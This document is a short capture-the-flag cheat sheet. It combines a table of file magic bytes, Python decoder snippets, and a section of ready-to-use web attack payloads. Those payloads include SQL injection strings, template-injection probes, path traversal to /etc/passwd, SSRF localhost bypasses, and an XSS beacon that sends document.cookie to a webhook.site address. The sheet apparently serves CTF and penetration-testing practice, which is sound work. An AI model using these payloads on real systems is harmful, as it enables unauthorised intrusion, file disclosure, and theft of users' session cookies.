# Payloads, Magic Bytes, And Decoders

## Magic Bytes

| Bytes/Text | Meaning |
|---|---|
| `89 50 4e 47 0d 0a 1a 0a` | PNG |
| `ff d8 ff` | JPEG |
| `47 49 46 38` | GIF |
| `25 50 44 46` | PDF |
| `50 4b 03 04` | ZIP/DOCX/XLSX/JAR/APK |
| `1f 8b 08` | gzip |
| `42 5a 68` | bzip2 |
| `fd 37 7a 58 5a 00` | xz |
| `7f 45 4c 46` | ELF |
| `4d 5a` | PE |
| `ca fe ba be` | Java class or Mach-O fat |
| `d0 cf 11 e0` | OLE Compound File |
| `52 61 72 21` | RAR |
| `37 7a bc af 27 1c` | 7z |
| `SQLite format 3` | SQLite DB |
| `RIFF....WAVE` | WAV |

## Web Payload Seeds

SQLi:

```text
'
"
' OR '1'='1'--
' UNION SELECT NULL,NULL,NULL--
' AND (SELECT CASE WHEN (substr(flag,1,1)='f') THEN 1 ELSE 1/0 END)--
```

SSTI:

```text
{{7*7}}
${7*7}
<%= 7*7 %>
{{config}}
```

Traversal/SSRF:

```text
../../../../etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
php://filter/convert.base64-encode/resource=index.php
http://127.0.0.1/
http://[::1]/
http://2130706433/
http://127.1/
http://evil.com@127.0.0.1/
```

XSS beacon:

```html
<img src=x onerror="new Image().src='https://webhook.site/ID?c='+encodeURIComponent(document.cookie)">
```

## Decoder Snippets

IEEE-754 floats:

```python
import struct
vals = [240600592, 212.2753143310547]
print(b''.join(struct.pack('>f', float(v)) for v in vals))
```

UTF-16 endian reversal:

```python
fixed = mojibake.encode('utf-16-be').decode('utf-16-le')
print(fixed)
```

BCD:

```python
data = bytes.fromhex("123456")
digits = ''.join(f'{b>>4}{b&15}' for b in data)
print(digits)
```

XOR brute:

```python
ct = bytes.fromhex("...")
for k in range(256):
    pt = bytes(c ^ k for c in ct)
    if all(32 <= x < 127 or x in (9,10,13) for x in pt):
        print(k, pt)
```

